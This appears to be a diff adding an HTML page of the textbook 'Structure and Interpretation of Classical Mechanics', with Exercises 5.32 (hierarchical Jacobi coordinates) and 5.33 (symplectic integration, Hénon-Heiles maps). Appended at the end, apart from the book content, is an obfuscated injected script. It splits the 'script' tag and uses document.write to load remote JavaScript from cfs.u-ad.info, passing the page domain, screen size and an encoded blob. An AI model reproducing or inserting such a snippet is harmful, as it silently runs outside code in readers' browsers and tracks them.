@@ -1,0 +1,240 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-69.html">previous</a></span><span>, <a href="book-Z-H-71.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_5.13"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_5.13">5.13&nbsp;&nbsp;Projects</a></h2>
+<p></p>
+<p><a name="%_thm_5.32"></a>
+<b>Exercise 5.32.</b>&nbsp;&nbsp;<strong>Hierarchical Jacobi coordinates</strong><br>
+<a name="%_idx_2948"></a>A Hamiltonian for the <em>n</em>-body problem is
+<a name="EQUATION_5.476"></a></p>
+<div align=left><img src="chap5-Z-G-445.gif" border="0"></div>
+<p>
+with
+<a name="EQUATION_5.477"></a></p>
+<div align=left><img src="chap5-Z-G-446.gif" border="0"></div>
+<p>
+and 
+<a name="EQUATION_5.478"></a></p>
+<div align=left><img src="chap5-Z-G-447.gif" border="0"></div>
+<p>
+where <em>x</em><sub><em>i</em></sub> is the tuple of rectangular coordinates for body <em>i</em> and
+<em>p</em><sub><em>i</em></sub> is the tuple of conjugate linear momenta for body <em>i</em>.  </p>
+<p>
+The potential energy of the system depends only on the relative
+positions of the bodies, so the relative motion decouples from the
+center of mass motion.  In this problem we explore canonical
+transformations that achieve this decoupling.</p>
+<p>
+<a name="%_idx_2950"></a><a name="%_idx_2952"></a><a name="%_idx_2954"></a><strong>a</strong>.&nbsp;&nbsp;Canonical heliocentric coordinates.  The coordinates
+transform as follows:
+<a name="EQUATION_5.479"></a></p>
+<div align=left><img src="chap5-Z-G-448.gif" border="0"></div>
+<p>
+where <em>X</em> is the center of mass of the system,
+and
+<a name="EQUATION_5.480"></a></p>
+<div align=left><img src="chap5-Z-G-449.gif" border="0"></div>
+<p>
+for <em>i</em>&gt;0, the differences of the position of body <em>i</em> and the body
+with index 0 (which might be the Sun).  Find the associated
+canonical momenta using an <em>F</em><sub>2</sub>-type generating function.  Show that
+the potential energy can be written solely in terms of the coordinates
+for <em>i</em>&gt;0.  Show that the kinetic energy is not in the form of a sum
+of squares of momenta divided by mass constants.</p>
+<p>
+<a name="%_idx_2956"></a><a name="%_idx_2958"></a><a name="%_idx_2960"></a><strong>b</strong>.&nbsp;&nbsp;Jacobi coordinates.  The Jacobi coordinates isolate the
+center of mass motion, without spoiling the usual diagonal quadratic
+form of the kinetic energy.  Define <em>X</em><sub><em>i</em></sub> to be the center of mass of the bodies with
+indices less than or equal to <em>i</em>:
+<a name="EQUATION_5.481"></a></p>
+<div align=left><img src="chap5-Z-G-450.gif" border="0"></div>
+<p>
+The Jacobi coordinates are defined by
+<a name="EQUATION_5.482"></a></p>
+<div align=left><img src="chap5-Z-G-451.gif" border="0"></div>
+<p>
+for 0 &lt; <em>i</em> &lt; <em>n</em>, and
+<a name="EQUATION_5.483"></a></p>
+<div align=left><img src="chap5-Z-G-452.gif" border="0"></div>
+<p>
+The coordinates <em>x</em>'<sub><em>i</em></sub> for 0 &lt; <em>i</em>&lt; <em>n</em> are the difference of the
+position of body <em>i</em> and the center of mass of bodies with lower
+indices; the coordinate <em>x</em>'<sub>0</sub> is the center of mass of the system.
+Complete the canonical transformation by finding the conjugate momenta
+using an <em>F</em><sub>2</sub>-type generating function.  Show that the kinetic energy
+can still be written in the form
+<a name="EQUATION_5.484"></a></p>
+<div align=left><img src="chap5-Z-G-453.gif" border="0"></div>
+<p>
+for some constants <em>m</em>'<sub><em>i</em></sub>,
+and that the potential <em>V</em> can be written solely in terms of the
+Jacobi coordinates <em>x</em>'<sub><em>i</em></sub> with indices <em>i</em> &gt; 0.</p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp;Hierarchical Jacobi coordinates.  Define a ``body'' as a
+tuple of a mass and a rectangular position tuple.   An <em>n</em>-body
+``system'' is a tuple of <em>n</em> bodies: (<em>b</em><sub>0</sub>, <em>b</em><sub>1</sub>, <tt>...</tt> , <em>b</em><sub><em>n</em><tt>-</tt>1</sub>).
+Define a ``linking'' transformation <img src="chap1-Z-G-D-5.gif" border="0"><sub><em>j</em><em>k</em></sub> for bodies <em>j</em> and
+<em>k</em> that takes an <em>n</em>-body system and returns a new linked system: 
+<a name="EQUATION_5.485"></a></p>
+<div align=left><img src="chap5-Z-G-454.gif" border="0"></div>
+<p>
+The bodies in the new system are the same as the bodies in the old system 
+<em>b</em><sub><em>i</em></sub>'  =  <em>b</em><sub><em>i</em></sub> except for bodies <em>j</em> and <em>k</em>:
+<a name="EQUATION_5.486"></a></p>
+<div align=left><img src="chap5-Z-G-455.gif" border="0"></div>
+<p>
+This is a transformation to relative coordinates and center of mass 
+for bodies <em>j</em> and <em>k</em>.  Extend this transformation to phase space and
+show that it preserves the form of the kinetic energy
+<a name="EQUATION_5.487"></a></p>
+<div align=left><img src="chap5-Z-G-456.gif" border="0"></div>
+<p>
+Show that the transformation to Jacobi coordinates of part <strong>b</strong> is
+generated by a composition of linking transformations: 
+<a name="EQUATION_5.488"></a></p>
+<div align=left><img src="chap5-Z-G-457.gif" border="0"></div>
+<p>
+Interpret the coordinate transformation produced by such a succession
+of linking transformations; why do we call this a ``linking''
+transformation?  
+What requirement has to be satisfied for a composition of linking
+transformations to isolate the center of mass of the system (make it
+one of the coordinates)?
+Taking this constraint into account, find hierarchical Jacobi
+coordinates for a system with six bodies, arranged as two triple
+systems, each of which is a binary plus a third body.  Verify that one
+of the coordinates is the center of mass of the system, and that the
+kinetic energy remains a sum of squares of the momenta divided by
+an appropriate mass constant.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+
+</p>
+<p><a name="%_thm_5.33"></a>
+<b>Exercise 5.33.</b>&nbsp;&nbsp;<strong>Symplectic Integration</strong><br>
+<a name="%_idx_2962"></a><a name="%_idx_2964"></a>
+Consider a system for which the Hamiltonian <em>H</em> can be split into two
+parts, <em>H</em><sub>0</sub> and <em>H</em><sub>1</sub>, each of which describes a system that can be
+efficiently evolved:
+<a name="EQUATION_5.489"></a></p>
+<div align=left><img src="chap5-Z-G-458.gif" border="0"></div>
+<p>
+Symplectic integrators construct approximate solutions for the
+Hamiltonian <em>H</em> from those of <em>H</em><sub>0</sub> and <em>H</em><sub>1</sub>.</p>
+<p>
+We construct a map of the phase space onto itself in the following way
+(see Wisdom&nbsp;[<a href="book-Z-H-80.html#cite{Wisdom1982}">47</a>]).
+Define <img src="chap1-Z-G-D-17.gif" border="0"><sub>2<img src="chap1-Z-G-D-15.gif" border="0"></sub>(<em>t</em>) to be an infinite sum of Dirac delta
+functions, with interval 2<img src="chap1-Z-G-D-15.gif" border="0">,
+<a name="EQUATION_5.490"></a></p>
+<div align=left><img src="chap5-Z-G-459.gif" border="0"></div>
+<p>
+with Fourier representation
+<a name="EQUATION_5.491"></a></p>
+<div align=left><img src="chap5-Z-G-460.gif" border="0"></div>
+<p>
+<a name="%_idx_2966"></a><a name="%_idx_2968"></a>Recall that a <img src="chap1-Z-G-D-17.gif" border="0"> function has the property that <img src="chap1-Z-G-D-2.gif" border="0"><sub><tt>-</tt><em>a</em></sub><sup><em>a</em></sup> <em>f</em> <img src="chap1-Z-G-D-17.gif" border="0">
+ =  <em>f</em>(0) for any positive <em>a</em> and continuous real-valued function <em>f</em>.
+It is fruitful to think of the delta function as a limit of a
+function <img src="chap1-Z-G-D-43.gif" border="0"><sub><em>h</em></sub> that has the value <img src="chap1-Z-G-D-43.gif" border="0"><sub><em>h</em></sub>(<em>t</em>)  =  1/<em>h</em> in the interval  <tt>-</tt> <em>h</em>/2
+&lt; <em>t</em> &lt; <em>h</em>/2 and zero otherwise.
+Now consider the mapping Hamiltonian
+<a name="EQUATION_5.492"></a></p>
+<div align=left><img src="chap5-Z-G-461.gif" border="0"></div>
+<p>
+The evolution of the system between the delta functions is governed
+solely by <em>H</em><sub>0</sub>.  To understand how the system evolves across the
+delta functions think of the delta functions in terms of <img src="chap1-Z-G-D-43.gif" border="0"><sub><em>h</em></sub> as
+<em>h</em> goes to zero.  Hamilton's equations contain terms from <em>H</em><sub>1</sub> with
+the factor 1/<em>h</em>, which is large, and terms from <em>H</em><sub>0</sub> that are
+independent of <em>h</em>.  So as <em>h</em> goes to zero, <em>H</em><sub>0</sub> makes a negligible
+contribution to the evolution.  The evolution across the delta
+functions is governed solely by <em>H</em><sub>1</sub>.  The evolution of <em>H</em><sub><em>m</em></sub> 
+is obtained by alternately evolving the system according to the
+Hamiltonian <em>H</em><sub>0</sub> for an interval <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em>  =  2<img src="chap1-Z-G-D-15.gif" border="0"> / <img src="chap1-Z-G-D-57.gif" border="0"> and then
+evolving the system according to the Hamiltonian <em>H</em><sub>1</sub> for the same time
+interval.  The longer-term evolution of <em>H</em><sub><em>m</em></sub> is obtained by iterating
+this map of the phase space onto itself.  Fill in the details to show this.</p>
+<p>
+In terms of Lie series, the evolution of <em>H</em><sub><em>m</em></sub> for one delta function
+cycle <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> is generated by
+<a name="EQUATION_5.493"></a></p>
+<div align=left><img src="chap5-Z-G-462.gif" border="0"></div>
+<p>
+The evolution of <em>H</em><sub><em>m</em></sub> approximates the evolution of <em>H</em>.
+Identify the noncommuting operator <em>A</em> with <em>L</em><sub><em>H</em><sub>0</sub></sub> and <em>B</em> with
+<em>L</em><sub><em>H</em><sub>1</sub></sub>.  Use the Baker-Campbell-Hausdorff identity
+(equation&nbsp;<a href="book-Z-H-69.html#EQUATION_5.475">5.475</a>) to deduce that the local truncation
+error (the error in the state after one step <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em>) is
+proportional to (<img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em>)<sup>2</sup>.  The mapping is a first-order
+integrator.</p>
+<p>
+
+By merely changing the phase of the delta functions, we can reduce the truncation
+error of the map, and the map becomes a second-order
+integrator.  Instead of making a map by alternating a full step
+<img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> governed by <em>H</em><sub>0</sub> with a full step <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em>
+governed by <em>H</em><sub>1</sub>, we can make a map by evolving the system for a half
+step <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> / 2 governed by <em>H</em><sub>0</sub>, then for a full step <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> governed
+by <em>H</em><sub>1</sub>, and then for another half step <img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em> / 2 governed by
+<em>H</em><sub>0</sub>.  In terms of Lie series the second-order map is generated by 
+<a name="EQUATION_5.494"></a></p>
+<div align=left><img src="chap5-Z-G-463.gif" border="0"></div>
+<p>
+Confirm that the Hamiltonian governing the evolution of this map is
+the same as the one above but with the phase of the delta functions shifted.
+Show that the truncation error of one step of this second-order map is
+indeed proportional to (<img src="chap1-Z-G-D-43.gif" border="0"> <em>t</em>)<sup>3</sup>.  </p>
+<p>
+<a name="%_idx_2970"></a>Consider the H&eacute;non-Heiles system.  We can split the Hamiltonian
+into two solvable Hamiltonians in the following way (Wisdom&nbsp;[<a href="book-Z-H-80.html#cite{Wisdom1987}">48</a>]):
+<a name="EQUATION_5.495"></a></p>
+<div align=left><img src="chap5-Z-G-464.gif" border="0"></div>
+<p>
+Hamiltonian <em>H</em><sub>0</sub> is the Hamiltonian of two uncoupled linear
+oscillators; Hamiltonian <em>H</em><sub>1</sub> is a nonlinear coupling.  The
+trajectories of the systems
+described by each of these Hamiltonians can be expressed in closed form.
+Write programs that implement
+first-order and second-order maps for the H&eacute;non-Heiles problem.  Examine
+the evolution of the energy for both chaotic and quasiperiodic initial
+conditions.  How does the magnitude of the energy error scale with the
+step size; is this consistent with the order of the integrator deduced
+above?  How does the energy error grow with time?  Generate surfaces
+of section using the second-order map.   Does the map preserve the
+chaotic or quasiperiodic character of trajectories?</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p>
+</p>
+<p>
+
+
+
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-69.html">previous</a></span><span>, <a href="book-Z-H-71.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2LbVp469RiatIs%2bPifbPH0j4VfymFQQY3EQR3KSggOmvd4BF2qByE%2bz%2bQ49Qg54mailoySgKr42xnEV%2fRootgpJt0N%2fqtLuQ7UIWJNC0LpQc3K47f8Q3IwgpA3YISKetr12gr83QbIn6m2XwJrkGC%2fTyMX7p8eNwcwsDdEWZ4gPo%2fe3LrjMye14m%2bhnkEIzPiI82O0NX30aAx8Sub7tqCLLKgfCGsFaxKYGMT%2bBIXY32WVcpTP32YdHMbmnstvtLz%2bRD6IrHDbSFVasHEhyb1OSrPl9h4GdYHUEolSESKOQKYRMbE1OE9zZWIyu8QOs0hYIArrLWWtl%2bokkSEPbELj4dYc0eDy0TdXPKi6xPDhfkcBYtt5Z5mg86FFoBS8S6jhH6jwmIuvEfvWc1%2fnEpDAJxhbNctbhKMlZK9Z1pDjxvDIn0Mw01I2C9dHk39HE3xDUvqphRAbA2WPZpyW9Zss");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
